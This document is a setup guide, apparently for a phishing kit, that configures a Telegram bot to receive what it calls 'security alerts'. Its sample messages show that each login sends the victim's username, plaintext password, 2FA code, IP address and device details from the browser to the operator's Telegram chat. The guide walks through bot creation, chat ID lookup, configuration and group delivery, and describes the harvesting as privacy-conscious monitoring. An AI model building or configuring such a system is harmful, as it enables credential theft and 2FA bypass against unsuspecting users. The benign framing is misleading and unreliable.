# Telegram Integration Setup Guide

## Overview
This application now includes a comprehensive Telegram notification system that sends real-time alerts when users attempt to log in or enter 2FA codes.

## Quick Setup

### 1. Create a Telegram Bot
1. Open Telegram and search for `@BotFather`
2. Start a chat and send `/newbot`
3. Follow the instructions to create your bot
4. Copy the bot token (looks like: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

### 2. Get Your Chat ID
1. Start a chat with your new bot
2. Send any message to the bot
3. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
4. Look for the `chat.id` in the response (it's a number like `123456789`)

### 3. Configure the Application
Open `src/config/telegram.ts` and update the configuration:

```typescript
export const telegramConfig: TelegramNotificationConfig = {
  bot: {
    botToken: "123456789:ABCdefGHIjklMNOpqrsTUVwxyz", // Your bot token
    chatId: "123456789",                               // Your chat ID
    enabled: true,                                     // Enable notifications
  },
  // ... rest of config
};
```

## Configuration Options

### Bot Settings
```typescript
bot: {
  botToken: "YOUR_BOT_TOKEN",  // Required: Bot token from @BotFather
  chatId: "YOUR_CHAT_ID",      // Required: Your chat ID
  enabled: true,               // Enable/disable all notifications
}
```

### Notification Types
```typescript
notifications: {
  loginAttempts: true,      // Send alerts for login attempts
  twoFactorCodes: true,     // Send alerts for 2FA codes
  includeUserAgent: true,   // Include browser/device info
  includeTimestamp: true,   // Include timestamp
  includeIpAddress: true,   // Include IP address
}
```

### Message Formatting
```typescript
messageFormat: {
  useEmojis: true,                    // Use emojis in messages
  includeLabels: true,                // Include field labels
  customPrefix: "🔐 Security Alert", // Custom message prefix
}
```

## Sample Notifications

### Login Attempt
```
🔐 Security Alert

👤 Username: john.doe@email.com
🔑 Password: mypassword123
🌐 IP: 192.168.1.100
💻 Device: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...

⏰ Time: 12/30/2024, 3:45:23 PM
```

### 2FA Code
```
🔐 Security Alert

👤 Username: john.doe@email.com
📱 2FA Code: 123456
🌐 IP: 192.168.1.100
💻 Device: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...

⏰ Time: 12/30/2024, 3:45:45 PM
```

## Security Features

- **Client-side only**: No server-side storage of Telegram credentials
- **Configurable**: Enable/disable specific notification types
- **IP detection**: Automatically detects user's IP address
- **Error handling**: Graceful failure if Telegram is unavailable
- **Privacy controls**: Choose what information to include

## Troubleshooting

### Bot Not Responding
1. Verify your bot token is correct
2. Make sure you've started a chat with the bot
3. Check that the bot isn't blocked

### Wrong Chat ID
1. Send a message to your bot
2. Visit the getUpdates URL again
3. Use the most recent chat.id value

### Notifications Not Sending
1. Check browser console for errors
2. Verify `enabled: true` in config
3. Ensure specific notification types are enabled
4. Check network connectivity

## Advanced Usage

### Group Notifications
To send notifications to a group:
1. Add your bot to the group
2. Make the bot an admin (optional)
3. Use the group's chat ID (usually negative number)

### Custom Message Format
You can customize the message format by modifying the `buildTelegramMessage` function in `src/config/telegram.ts`.

### Disable Specific Features
```typescript
notifications: {
  loginAttempts: true,      // Keep login notifications
  twoFactorCodes: false,    // Disable 2FA notifications
  includeUserAgent: false,  // Don't include device info
  includeTimestamp: true,   // Keep timestamps
  includeIpAddress: false,  // Don't include IP
}
```

## Privacy Considerations

- All data is sent directly from the user's browser to Telegram
- No data is stored on your servers
- Users' IP addresses are detected client-side
- Consider local privacy laws when collecting user data

## Support

If you need help:
1. Check the browser console for error messages
2. Verify your Telegram bot setup
3. Test with a simple message to ensure bot connectivity
4. Review the configuration options above